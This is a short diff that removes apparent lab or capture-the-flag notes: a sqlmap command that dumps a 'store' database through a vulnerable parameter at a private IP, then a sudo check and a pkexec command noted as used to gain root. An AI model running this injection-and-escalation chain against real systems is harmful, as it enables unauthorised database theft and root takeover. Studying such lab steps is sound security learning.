@@ -1,5 +1,0 @@
-sqlmap -u http://10.0.0.118/store/bookPerPub.php?pubid= --dump-all --batch -D store
-sudo -l
-
-#used this command to gain root access
-sudo /usr/bin/pkexec /bin/sh
